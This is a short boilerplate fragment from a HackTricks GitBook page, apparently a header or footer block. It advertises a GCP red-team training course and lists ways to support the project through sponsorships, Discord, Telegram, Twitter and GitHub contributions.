Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
